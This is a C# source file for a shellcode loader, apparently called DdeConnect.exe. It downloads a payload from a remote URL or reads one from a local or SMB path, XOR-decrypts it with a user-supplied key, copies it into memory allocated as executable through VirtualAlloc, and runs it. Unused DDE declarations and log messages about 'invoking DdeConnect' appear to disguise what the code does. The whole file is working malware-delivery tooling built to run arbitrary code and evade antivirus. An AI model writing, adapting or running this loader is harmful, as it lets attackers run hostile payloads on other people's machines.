using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;

class Program
{
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    public delegate int DdeCallback(int uType, int uFmt, IntPtr hconv, IntPtr hsz1, IntPtr hsz2, IntPtr hdata, int dwData1, int dwData2); // make this public

    [DllImport("user32.dll", SetLastError = true)]
    public static extern int DdeInitialize(ref int pidInst, DdeCallback pfnCallback, uint afCmd, uint ulRes);


    [DllImport("user32.dll", SetLastError = true)]
    public static extern int DdeUninitialize(int idInst);

    const uint MEM_RELEASE = 0x8000;
    const int DMLERR_NO_ERROR = 0;

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void ShellcodeDelegate();


    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: DdeConnect.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        Console.WriteLine("[Info] Allocating memory for shellcode.");
        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Memory allocated for shellcode.");
        }

        // Copy the shellcode to the allocated memory.
        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);
        Console.WriteLine("[Info] Copied shellcode to allocated memory.");

        try
        {
            // Create a delegate to the shellcode's memory address
            var shellcodeFunction = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(ShellcodeDelegate));
            Console.WriteLine("[Info] Attempting to invoke DdeConnect...");
            // Invoke the shellcode
            shellcodeFunction();
            //Console.WriteLine("[Success] Invoked DdeConnect.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Failed] Shellcode execution failed: {ex.Message}");
            Console.WriteLine("[Failed] Failed to invoke DdeConnect.");
        }


        // Free the allocated memory.
        VirtualFree(hAlloc, 0, MEM_RELEASE);
    }


    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
